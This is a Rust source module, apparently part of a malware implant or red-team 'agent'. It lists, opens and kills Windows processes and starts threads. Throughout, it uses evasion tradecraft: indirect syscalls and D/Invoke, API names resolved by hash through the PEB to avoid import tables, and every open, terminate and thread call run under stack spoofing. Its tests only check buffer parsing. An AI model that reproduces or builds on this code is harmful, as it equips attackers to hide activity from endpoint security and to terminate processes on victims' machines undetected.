// Process enumeration / open / terminate via Nt* syscalls (default Windows path).
//
// Call chain per operation (high → low):
//   1. Indirect syscall (x64) / ntdll D/Invoke (x86)  — via `syscall_nt!`
//   2. Explicit ntdll D/Invoke (if step 1 cannot resolve)
//   3. Win32 dynamic resolve (kernel32 OpenProcess / Toolhelp / TerminateProcess)
//
// open/terminate always run under stack spoof framing (x64 bait + noise).

use crate::stealth;

pub const PROCESS_TERMINATE: u32 = 0x0001;
pub const PROCESS_CREATE_PROCESS: u32 = 0x0080;
pub const PROCESS_QUERY_LIMITED_INFORMATION: u32 = 0x1000;
/// NtCurrentProcess() pseudo-handle
pub const CURRENT_PROCESS: usize = usize::MAX; // -1

const STATUS_INFO_LENGTH_MISMATCH: i32 = 0xC0000004u32 as i32;
const STATUS_SUCCESS: i32 = 0;
const SYSTEM_PROCESS_INFORMATION: u32 = 5;

/// Cap NtQuerySystemInformation buffer growth (prevents memory blow-up).
const SPI_BUF_START: u32 = 1 << 20; // 1 MiB
const SPI_BUF_MAX: u32 = 8 << 20; // 8 MiB hard cap
const SPI_MAX_ROUNDS: u32 = 8;

/// Minimum size of one SYSTEM_PROCESS_INFORMATION record we will accept.
#[cfg(target_arch = "x86_64")]
const SPI_MIN_ENTRY: usize = 0x60;
#[cfg(target_arch = "x86")]
const SPI_MIN_ENTRY: usize = 0x50;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ProcessInfo {
    pub pid: u32,
    pub ppid: u32,
    pub name: String,
}

// ─── NT structures ───────────────────────────────────────────────────────────

#[repr(C)]
struct ClientId {
    unique_process: usize,
    unique_thread: usize,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    #[cfg(target_arch = "x86_64")]
    _pad0: u32,
    root_directory: usize,
    object_name: usize,
    attributes: u32,
    #[cfg(target_arch = "x86_64")]
    _pad1: u32,
    security_descriptor: usize,
    security_quality_of_service: usize,
}

impl ObjectAttributes {
    fn empty() -> Self {
        Self {
            length: std::mem::size_of::<Self>() as u32,
            #[cfg(target_arch = "x86_64")]
            _pad0: 0,
            root_directory: 0,
            object_name: 0,
            attributes: 0,
            #[cfg(target_arch = "x86_64")]
            _pad1: 0,
            security_descriptor: 0,
            security_quality_of_service: 0,
        }
    }
}

// ─── Unified Nt invoke with D/Invoke secondary path ──────────────────────────

/// Primary: `indirect_syscall` (x64 gadget / x86 D/Invoke).
/// Secondary: force PEB-resolved ntdll call if primary returns our "unresolved" marker.
pub(crate) unsafe fn invoke_nt(name: &[u8], args: &[usize]) -> i32 {
    let hash = stealth::hash_api_name(name);
    let status = crate::syscalls::indirect_syscall(hash, args);

    // Our layers use -1 when the export/SSN cannot be resolved at all.
    // Legitimate NTSTATUS failures are typically 0xC000xxxx (negative but != -1).
    if status != -1 {
        return status;
    }

    // Explicit D/Invoke retry (also covers edge cases where gadget path failed early).
    dinvoke_ntdll(hash, args)
}

unsafe fn dinvoke_ntdll(hash: u32, args: &[usize]) -> i32 {
    let ntdll = stealth::get_module_base(stealth::hash_module_name(b"ntdll.dll"));
    if ntdll == 0 {
        return -1;
    }
    let addr = match stealth::get_api_addr(ntdll, hash) {
        Some(a) if a != 0 => a,
        _ => return -1,
    };

    // Call with up to 11 args (same convention as syscalls::direct_api_call).
    let mut a = [0usize; 11];
    for (i, &v) in args.iter().enumerate() {
        if i < 11 {
            a[i] = v;
        }
    }

    #[cfg(target_arch = "x86_64")]
    {
        let mut result: i32;
        std::arch::asm!(
            "mov r12, rsp",
            "sub rsp, 0x68",
            "and rsp, -16",
            "mov r13, [r14 + 32]", "mov [rsp + 0x20], r13",
            "mov r13, [r14 + 40]", "mov [rsp + 0x28], r13",
            "mov r13, [r14 + 48]", "mov [rsp + 0x30], r13",
            "mov r13, [r14 + 56]", "mov [rsp + 0x38], r13",
            "mov r13, [r14 + 64]", "mov [rsp + 0x40], r13",
            "mov r13, [r14 + 72]", "mov [rsp + 0x48], r13",
            "mov r13, [r14 + 80]", "mov [rsp + 0x50], r13",
            "call r15",
            "mov rsp, r12",
            in("r14") a.as_ptr(),
            in("r15") addr,
            out("r12") _,
            out("r13") _,
            in("rcx") a[0],
            in("rdx") a[1],
            in("r8") a[2],
            in("r9") a[3],
            lateout("rax") result,
            clobber_abi("system")
        );
        result
    }

    #[cfg(target_arch = "x86")]
    {
        let argc = args.len().min(11);
        let args_ptr = a.as_ptr();
        let result: i32;
        std::arch::asm!(
            "mov edi, esp",
            "mov ecx, {argc}",
            "test ecx, ecx",
            "jz 99f",
            "mov edx, {args_ptr}",
            "lea edx, [edx + ecx*4 - 4]",
            "98:",
            "push dword ptr [edx]",
            "sub edx, 4",
            "dec ecx",
            "jnz 98b",
            "99:",
            "call {func}",
            "mov esp, edi",
            argc = in(reg) argc,
            args_ptr = in(reg) args_ptr,
            func = in(reg) addr,
            out("edi") _,
            out("ecx") _,
            out("edx") _,
            lateout("eax") result,
        );
        result
    }
}

// ─── SPI parsing (arch-aware, safe NextEntryOffset walk) ─────────────────────

/// Offsets inside SYSTEM_PROCESS_INFORMATION (Vista+ / Win7 field layout).
///
/// x64:
///   ImageName @ 0x38 (UNICODE_STRING 16B), UniqueProcessId @ 0x50, InheritedFrom @ 0x58
/// x86:
///   ImageName @ 0x38 (UNICODE_STRING 8B), UniqueProcessId @ 0x44, InheritedFrom @ 0x48
#[inline]
fn spi_field_offsets() -> (usize, usize, usize, usize) {
    // (image_name_off, image_name_buf_off_within_us, pid_off, ppid_off)
    #[cfg(target_arch = "x86_64")]
    {
        (0x38, 0x08, 0x50, 0x58)
    }
    #[cfg(target_arch = "x86")]
    {
        (0x38, 0x04, 0x44, 0x48)
    }
}

/// Parse a raw SystemProcessInformation buffer.
///
/// `buf` must remain valid for the lifetime of embedded UNICODE_STRING buffers
/// (they point into kernel-returned data inside `buf` for live queries; tests
/// may point at external UTF-16 storage).
pub(crate) fn parse_system_process_info(buf: &[u8]) -> Result<Vec<ProcessInfo>, String> {
    let mut out = Vec::new();
    if buf.len() < SPI_MIN_ENTRY {
        return Ok(out);
    }

    let (_name_off, _buf_in_us, pid_off, ppid_off) = spi_field_offsets();
    let need = ppid_off + std::mem::size_of::<usize>();

    let mut offset = 0usize;
    let mut guard = 0usize;
    let max_entries = 1_000_000; // absolute loop guard

    while guard < max_entries {
        guard += 1;

        if offset
            .checked_add(need)
            .map(|e| e > buf.len())
            .unwrap_or(true)
        {
            break;
        }

        let base = unsafe { buf.as_ptr().add(offset) };
        let next = unsafe { read_u32(base, 0) } as usize;

        // Corrupt / hostile next offsets
        if next != 0 && next < SPI_MIN_ENTRY {
            break;
        }
        if next != 0 {
            if let Some(sum) = offset.checked_add(next) {
                if sum <= offset || sum > buf.len() {
                    break;
                }
            } else {
                break;
            }
        }

        let pid = unsafe { read_usize(base, pid_off) } as u32;
        let ppid = unsafe { read_usize(base, ppid_off) } as u32;
        let name = unsafe { read_image_name(base) };

        let name = if name.is_empty() && pid == 0 {
            "[System Process]".to_string()
        } else {
            name
        };

        out.push(ProcessInfo { pid, ppid, name });

        if next == 0 {
            break;
        }
        offset += next;
    }

    Ok(out)
}

/// Read ImageName UNICODE_STRING from an SPI entry base pointer.
unsafe fn read_image_name(base: *const u8) -> String {
    let (name_off, buf_in_us, _, _) = spi_field_offsets();
    let us = base.add(name_off);
    let length = read_u16(us, 0) as usize;
    if length == 0 || length > 0x200 {
        return String::new();
    }
    let nchars = length / 2;
    let buffer = read_usize(us, buf_in_us) as *const u16;
    if buffer.is_null() {
        return String::new();
    }
    // Best-effort: buffer should point into the same allocation for live queries.
    let slice = std::slice::from_raw_parts(buffer, nchars);
    String::from_utf16_lossy(slice)
}

#[inline]
unsafe fn read_u16(base: *const u8, off: usize) -> u16 {
    std::ptr::read_unaligned(base.add(off) as *const u16)
}

#[inline]
unsafe fn read_u32(base: *const u8, off: usize) -> u32 {
    std::ptr::read_unaligned(base.add(off) as *const u32)
}

#[inline]
unsafe fn read_usize(base: *const u8, off: usize) -> usize {
    std::ptr::read_unaligned(base.add(off) as *const usize)
}

// ─── Public API ──────────────────────────────────────────────────────────────

/// List processes via NtQuerySystemInformation, with Toolhelp Win32 fallback.
pub fn list_processes() -> Result<Vec<ProcessInfo>, String> {
    match list_processes_nt() {
        Ok(list) if !list.is_empty() => Ok(list),
        Ok(_) => {
            // Empty can be legitimate on a bare system, but also a parse failure —
            // try Win32 once to be sure we didn't mis-parse.
            list_processes_win32().or_else(|_| Ok(Vec::new()))
        }
        Err(e) => list_processes_win32().map_err(|e2| format!("{e}; win32 fallback: {e2}")),
    }
}

fn list_processes_nt() -> Result<Vec<ProcessInfo>, String> {
    unsafe {
        let mut buf_len: u32 = SPI_BUF_START;
        let mut buf: Vec<u8> = Vec::new();
        let mut last_status: i32 = -1;

        for _ in 0..SPI_MAX_ROUNDS {
            if buf_len > SPI_BUF_MAX {
                buf_len = SPI_BUF_MAX;
            }
            buf.resize(buf_len as usize, 0);
            let mut return_len: u32 = 0;
            let status = invoke_nt(
                b"NtQuerySystemInformation",
                &[
                    SYSTEM_PROCESS_INFORMATION as usize,
                    buf.as_mut_ptr() as usize,
                    buf_len as usize,
                    &mut return_len as *mut u32 as usize,
                ],
            );
            last_status = status;

            if status == STATUS_SUCCESS {
                // Truncate to used region when known (helps tests / partial fills).
                if return_len > 0 && (return_len as usize) < buf.len() {
                    buf.truncate(return_len as usize);
                }
                return parse_system_process_info(&buf);
            }

            if status == STATUS_INFO_LENGTH_MISMATCH {
                let next = if return_len > buf_len {
                    return_len.saturating_add(0x10000)
                } else {
                    buf_len.saturating_mul(2).max(SPI_BUF_START)
                };
                if next > SPI_BUF_MAX {
                    if buf_len >= SPI_BUF_MAX {
                        return Err(format!(
                            "NtQuerySystemInformation buffer exceeds {} MiB cap",
                            SPI_BUF_MAX >> 20
                        ));
                    }
                    buf_len = SPI_BUF_MAX;
                } else {
                    buf_len = next;
                }
                continue;
            }

            return Err(format!(
                "NtQuerySystemInformation failed: 0x{:08X}",
                status as u32
            ));
        }

        Err(format!(
            "NtQuerySystemInformation exhausted retries (last=0x{:08X})",
            last_status as u32
        ))
    }
}

/// Win32 fallback: CreateToolhelp32Snapshot via PEB (no IAT).
fn list_processes_win32() -> Result<Vec<ProcessInfo>, String> {
    unsafe {
        let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
        if k32 == 0 {
            return Err("kernel32 not found".into());
        }

        type CreateSnap = unsafe extern "system" fn(u32, u32) -> usize;
        type Process32FirstW = unsafe extern "system" fn(usize, *mut ProcessEntry32W) -> i32;
        type Process32NextW = unsafe extern "system" fn(usize, *mut ProcessEntry32W) -> i32;
        type CloseHandleFn = unsafe extern "system" fn(usize) -> i32;

        let create_snap: CreateSnap = std::mem::transmute(
            stealth::get_api_addr(k32, stealth::hash_api_name(b"CreateToolhelp32Snapshot"))
                .ok_or("CreateToolhelp32Snapshot")?,
        );
        let p_first: Process32FirstW = std::mem::transmute(
            stealth::get_api_addr(k32, stealth::hash_api_name(b"Process32FirstW"))
                .ok_or("Process32FirstW")?,
        );
        let p_next: Process32NextW = std::mem::transmute(
            stealth::get_api_addr(k32, stealth::hash_api_name(b"Process32NextW"))
                .ok_or("Process32NextW")?,
        );
        let close: CloseHandleFn = std::mem::transmute(
            stealth::get_api_addr(k32, stealth::hash_api_name(b"CloseHandle"))
                .ok_or("CloseHandle")?,
        );

        const TH32CS_SNAPPROCESS: u32 = 0x00000002;
        let snap = create_snap(TH32CS_SNAPPROCESS, 0);
        if snap == 0 || snap == usize::MAX {
            return Err("CreateToolhelp32Snapshot failed".into());
        }

        let mut entry: ProcessEntry32W = std::mem::zeroed();
        entry.dw_size = std::mem::size_of::<ProcessEntry32W>() as u32;

        let mut list = Vec::new();
        if p_first(snap, &mut entry) != 0 {
            loop {
                let name = String::from_utf16_lossy(&entry.sz_exe_file)
                    .trim_end_matches('\0')
                    .to_string();
                list.push(ProcessInfo {
                    pid: entry.th32_process_id,
                    ppid: entry.th32_parent_process_id,
                    name,
                });
                if p_next(snap, &mut entry) == 0 {
                    break;
                }
            }
        }
        close(snap);
        Ok(list)
    }
}

#[repr(C)]
struct ProcessEntry32W {
    dw_size: u32,
    cnt_usage: u32,
    th32_process_id: u32,
    th32_default_heap_id: usize,
    th32_module_id: u32,
    cnt_threads: u32,
    th32_parent_process_id: u32,
    pc_pri_class_base: i32,
    dw_flags: u32,
    sz_exe_file: [u16; 260],
}

/// Find first PID whose image name contains `needle` (case-insensitive).
pub fn find_pid_by_name(needle: &str) -> Option<u32> {
    let needle = needle.to_lowercase();
    let list = list_processes().ok()?;
    list.into_iter()
        .find(|p| p.name.to_lowercase().contains(&needle))
        .map(|p| p.pid)
}

/// Open process: syscall → D/Invoke → Win32 OpenProcess (all under stack spoof).
pub fn open_process(pid: u32, access: u32) -> Result<usize, String> {
    if pid == 0 {
        return Err("Invalid PID".into());
    }

    crate::stealth::stack::with_spoofed_stack(|| open_process_inner(pid, access))
}

fn open_process_inner(pid: u32, access: u32) -> Result<usize, String> {
    let mut handle: usize = 0;
    let mut oa = ObjectAttributes::empty();
    let mut cid = ClientId {
        unique_process: pid as usize,
        unique_thread: 0,
    };

    let status = unsafe {
        invoke_nt(
            b"NtOpenProcess",
            &[
                &mut handle as *mut usize as usize,
                access as usize,
                &mut oa as *mut ObjectAttributes as usize,
                &mut cid as *mut ClientId as usize,
            ],
        )
    };

    if status >= 0 && handle != 0 {
        return Ok(handle);
    }

    // Win32 fallback (PEB-resolved OpenProcess)
    match open_process_win32(pid, access) {
        Ok(h) => Ok(h),
        Err(e2) => Err(format!(
            "NtOpenProcess 0x{:08X}; win32 fallback: {e2}",
            status as u32
        )),
    }
}

fn open_process_win32(pid: u32, access: u32) -> Result<usize, String> {
    unsafe {
        let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
        if k32 == 0 {
            return Err("kernel32 not found".into());
        }
        let addr = stealth::get_api_addr(k32, stealth::hash_api_name(b"OpenProcess"))
            .ok_or("OpenProcess unresolved")?;
        type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> usize;
        let open: OpenProcessFn = std::mem::transmute(addr);
        let h = open(access, 0, pid);
        if h == 0 {
            return Err("OpenProcess returned NULL".into());
        }
        Ok(h)
    }
}

/// Terminate: stack-spoofed open + NtTerminateProcess, then Win32 TerminateProcess fallback.
pub fn terminate_process(pid: u32) -> Result<(), String> {
    crate::stealth::stack::with_spoofed_stack(|| terminate_process_inner(pid))
}

fn terminate_process_inner(pid: u32) -> Result<(), String> {
    // Prefer NT path with PROCESS_TERMINATE
    if let Ok(handle) = open_process_inner(pid, PROCESS_TERMINATE) {
        let status = unsafe { invoke_nt(b"NtTerminateProcess", &[handle, 1]) };
        let _ = close_handle(handle);
        if status >= 0 {
            return Ok(());
        }
        // Fall through to Win32 with a fresh handle
        crate::utils::db_print(&format!(
            "[agent] NtTerminateProcess 0x{:08X}, trying Win32",
            status as u32
        ));
    }

    terminate_process_win32(pid)
}

fn terminate_process_win32(pid: u32) -> Result<(), String> {
    unsafe {
        let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
        if k32 == 0 {
            return Err("kernel32 not found".into());
        }
        type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> usize;
        type TerminateProcessFn = unsafe extern "system" fn(usize, u32) -> i32;
        type CloseHandleFn = unsafe extern "system" fn(usize) -> i32;

        let open: OpenProcessFn = std::mem::transmute(
            stealth::get_api_addr(k32, stealth::hash_api_name(b"OpenProcess"))
                .ok_or("OpenProcess")?,
        );
        let term: TerminateProcessFn = std::mem::transmute(
            stealth::get_api_addr(k32, stealth::hash_api_name(b"TerminateProcess"))
                .ok_or("TerminateProcess")?,
        );
        let close: CloseHandleFn = std::mem::transmute(
            stealth::get_api_addr(k32, stealth::hash_api_name(b"CloseHandle"))
                .ok_or("CloseHandle")?,
        );

        let h = open(PROCESS_TERMINATE, 0, pid);
        if h == 0 {
            return Err("OpenProcess failed".into());
        }
        let ok = term(h, 1);
        close(h);
        if ok == 0 {
            return Err("TerminateProcess failed".into());
        }
        Ok(())
    }
}

pub fn close_handle(handle: usize) -> i32 {
    if handle == 0 {
        return 0;
    }
    let status = unsafe { invoke_nt(b"NtClose", &[handle]) };
    if status != -1 {
        return status;
    }
    // Win32 CloseHandle fallback
    unsafe {
        let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
        if let Some(addr) = stealth::get_api_addr(k32, stealth::hash_api_name(b"CloseHandle")) {
            type CloseHandleFn = unsafe extern "system" fn(usize) -> i32;
            let close: CloseHandleFn = std::mem::transmute(addr);
            return if close(handle) != 0 { 0 } else { -1 };
        }
    }
    -1
}

/// NtCreateThreadEx in the current process (syscall → D/Invoke; no Win32 CreateThread IAT).
///
/// `stack_size` semantics (both paths):
/// - `0` → OS default stack (recommended; safest across Win7–Win11 / Server SKUs)
/// - non-zero → commit size; reserve is set to `max(stack_size, default-ish 1MiB)` so
///   commit never exceeds reserve (old kernels reject / mis-handle commit>reserve).
pub fn create_thread_ex(
    start: unsafe extern "system" fn(*mut winapi::ctypes::c_void) -> u32,
    param: *mut winapi::ctypes::c_void,
    stack_size: usize,
) -> Result<usize, String> {
    crate::stealth::stack::with_spoofed_stack(|| {
        let mut thread_handle: usize = 0;
        let desired_access: u32 = 0x1F_FFFF;
        let create_flags: u32 = 0;
        let start_addr = start as usize;

        // NtCreateThreadEx(StackCommit, StackReserve): reserve must be ≥ commit.
        // Passing commit=8MiB with reserve=0 caused STATUS_INVALID_PARAMETER or
        // unstable behavior on Server 2012 R2 (6.3). Use 0/0 for defaults.
        let (commit, reserve) = if stack_size == 0 {
            (0usize, 0usize)
        } else {
            let commit = stack_size;
            let reserve = stack_size.max(1024 * 1024);
            (commit, reserve)
        };

        let status = unsafe {
            invoke_nt(
                b"NtCreateThreadEx",
                &[
                    &mut thread_handle as *mut usize as usize,
                    desired_access as usize,
                    0,
                    CURRENT_PROCESS,
                    start_addr,
                    param as usize,
                    create_flags as usize,
                    0,
                    commit,
                    reserve,
                    0,
                ],
            )
        };

        if status >= 0 && thread_handle != 0 {
            return Ok(thread_handle);
        }

        // Win32 CreateThread fallback (PEB)
        unsafe {
            let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
            type CreateThreadFn = unsafe extern "system" fn(
                *mut winapi::ctypes::c_void,
                usize,
                Option<unsafe extern "system" fn(*mut winapi::ctypes::c_void) -> u32>,
                *mut winapi::ctypes::c_void,
                u32,
                *mut u32,
            ) -> usize;
            let ct: CreateThreadFn = std::mem::transmute(
                stealth::get_api_addr(k32, stealth::hash_api_name(b"CreateThread")).ok_or_else(
                    || {
                        format!(
                            "NtCreateThreadEx 0x{:08X}; CreateThread unresolved",
                            status as u32
                        )
                    },
                )?,
            );
            // CreateThread: 0 = default; non-zero = commit size (fine without reserve).
            let h = ct(
                std::ptr::null_mut(),
                stack_size,
                Some(start),
                param,
                0,
                std::ptr::null_mut(),
            );
            if h == 0 {
                return Err(format!(
                    "NtCreateThreadEx 0x{:08X}; CreateThread failed",
                    status as u32
                ));
            }
            Ok(h)
        }
    })
}

/// Wait forever. Returns 0 if signaled (WAIT_OBJECT_0), non-zero otherwise.
pub fn wait_for_single_object(handle: usize) -> i32 {
    if wait_for_single_object_timeout(handle, 0xFFFF_FFFF) {
        0
    } else {
        1
    }
}

/// Wait up to `timeout_ms` (0xFFFFFFFF = infinite). Returns true if signaled.
pub fn wait_for_single_object_timeout(handle: usize, timeout_ms: u32) -> bool {
    unsafe {
        let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
        if let Some(addr) =
            stealth::get_api_addr(k32, stealth::hash_api_name(b"WaitForSingleObject"))
        {
            type WaitFn = unsafe extern "system" fn(usize, u32) -> u32;
            let wait: WaitFn = std::mem::transmute(addr);
            // WAIT_OBJECT_0 = 0, WAIT_TIMEOUT = 258
            return wait(handle, timeout_ms) == 0;
        }
    }
    if timeout_ms == 0xFFFF_FFFF {
        let status = unsafe { invoke_nt(b"NtWaitForSingleObject", &[handle, 0, 0]) };
        return status == 0;
    }
    false
}

/// Terminate by process handle (not PID).
pub fn terminate_process_handle(handle: usize) -> Result<(), String> {
    unsafe {
        let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
        if let Some(addr) = stealth::get_api_addr(k32, stealth::hash_api_name(b"TerminateProcess"))
        {
            type Term = unsafe extern "system" fn(usize, u32) -> i32;
            let f: Term = std::mem::transmute(addr);
            if f(handle, 1) == 0 {
                return Err("TerminateProcess failed".into());
            }
            return Ok(());
        }
    }
    Err("TerminateProcess unavailable".into())
}

// ─── Unit tests (pure buffer parse — no Windows APIs required) ───────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn write_u16(buf: &mut [u8], off: usize, v: u16) {
        buf[off..off + 2].copy_from_slice(&v.to_le_bytes());
    }
    fn write_u32(buf: &mut [u8], off: usize, v: u32) {
        buf[off..off + 4].copy_from_slice(&v.to_le_bytes());
    }
    fn write_usize(buf: &mut [u8], off: usize, v: usize) {
        let bytes = v.to_le_bytes();
        buf[off..off + std::mem::size_of::<usize>()].copy_from_slice(&bytes);
    }

    /// Build two SPI entries with names living in stable Vecs (pointer targets).
    #[test]
    fn parse_two_entries_next_offset_chain() {
        let name1: Vec<u16> = "explorer.exe".encode_utf16().collect();
        let name2: Vec<u16> = "svchost.exe".encode_utf16().collect();

        let stride = 0x100usize;
        let mut buf = vec![0u8; stride * 2];

        let (name_off, buf_in_us, pid_off, ppid_off) = spi_field_offsets();

        // Entry 0 → next = stride
        write_u32(&mut buf, 0, stride as u32);
        write_usize(&mut buf, pid_off, 1234);
        write_usize(&mut buf, ppid_off, 100);
        write_u16(&mut buf, name_off, (name1.len() * 2) as u16);
        write_u16(&mut buf, name_off + 2, (name1.len() * 2) as u16);
        write_usize(&mut buf, name_off + buf_in_us, name1.as_ptr() as usize);

        // Entry 1 → next = 0
        let o = stride;
        write_u32(&mut buf, o, 0);
        write_usize(&mut buf, o + pid_off, 5678);
        write_usize(&mut buf, o + ppid_off, 1234);
        write_u16(&mut buf, o + name_off, (name2.len() * 2) as u16);
        write_u16(&mut buf, o + name_off + 2, (name2.len() * 2) as u16);
        write_usize(&mut buf, o + name_off + buf_in_us, name2.as_ptr() as usize);

        let list = parse_system_process_info(&buf).expect("parse");
        assert_eq!(list.len(), 2);
        assert_eq!(
            list[0],
            ProcessInfo {
                pid: 1234,
                ppid: 100,
                name: "explorer.exe".into()
            }
        );
        assert_eq!(
            list[1],
            ProcessInfo {
                pid: 5678,
                ppid: 1234,
                name: "svchost.exe".into()
            }
        );
    }

    #[test]
    fn parse_rejects_tiny_next_offset() {
        let mut buf = vec![0u8; SPI_MIN_ENTRY * 2];
        // Malicious next = 4 (smaller than min entry)
        write_u32(&mut buf, 0, 4);
        write_usize(&mut buf, spi_field_offsets().2, 1);
        let list = parse_system_process_info(&buf).unwrap();
        // First entry may be pushed, then loop breaks on corrupt next
        assert!(list.len() <= 1);
    }

    #[test]
    fn parse_system_idle_empty_name() {
        let mut buf = vec![0u8; SPI_MIN_ENTRY];
        write_u32(&mut buf, 0, 0); // next = 0
        write_usize(&mut buf, spi_field_offsets().2, 0); // pid 0
        write_usize(&mut buf, spi_field_offsets().3, 0);
        let list = parse_system_process_info(&buf).unwrap();
        assert_eq!(list.len(), 1);
        assert_eq!(list[0].pid, 0);
        assert_eq!(list[0].name, "[System Process]");
    }

    #[test]
    fn parse_empty_buffer() {
        let list = parse_system_process_info(&[]).unwrap();
        assert!(list.is_empty());
    }

    #[test]
    fn spi_buffer_cap_constant() {
        assert_eq!(SPI_BUF_MAX, 8 << 20);
        assert!(SPI_BUF_START < SPI_BUF_MAX);
    }
}
